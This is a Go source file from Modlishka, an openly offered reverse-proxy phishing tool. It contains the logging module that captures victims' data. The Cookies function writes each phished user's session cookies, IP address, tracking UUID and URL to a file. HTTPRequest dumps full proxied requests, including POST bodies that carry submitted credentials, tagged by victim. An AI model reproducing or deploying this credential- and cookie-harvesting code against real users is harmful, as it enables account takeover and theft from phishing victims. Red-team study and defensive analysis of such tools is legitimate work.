/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package log

import (
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"time"
)

var file *os.File = nil

func FunctionTracking(start time.Time, name string) {
	elapsed := time.Since(start)
	if elapsed.Seconds() > 1.0 {
		Warningf("%s took %s", name, elapsed)
	} else {
		Debugf("%s took %s", name, elapsed)
	}
}

func toFile(data string) {

	if Options.FilePath != "" {
		if file == nil {
			file, _ = os.OpenFile(Options.FilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		}

		if _, err := file.Write([]byte(data)); err != nil {
			Debugf(err.Error())
		}

	}

}

func Cookies(phishUser string, URL string, cookies []string, IP string) {

	cookieString := strings.Join(cookies, "####")

	toFile("\nCOOKIES" +
		"\n======\nTimestamp: " + time.Now().Format(time.RFC850) +
		"\n======\nRemoteIP: " + IP +
		"\n======\nUUID: " + phishUser +
		"\n======\nURL: " + URL +
		"\n======\n" + string(cookieString) +
		"\n======\n")

}

func HTTPRequest(req *http.Request, phishUser string) {

	if Options.POST && req.Method != "POST" {
		return
	}

	// LOG final request
	requestDump, err := httputil.DumpRequest(req, true)
	if err != nil {
		Errorf("Error dumping request: %s", err)
	}

	toFile("\nREQUEST" +
		"\n======\nTimestamp: " + time.Now().Format(time.RFC850) +
		"\n======\nRemoteIP: " + req.RemoteAddr +
		"\n======\nUUID: " + phishUser +
		"\n======\n" + string(requestDump) +
		"\n======\n")

}
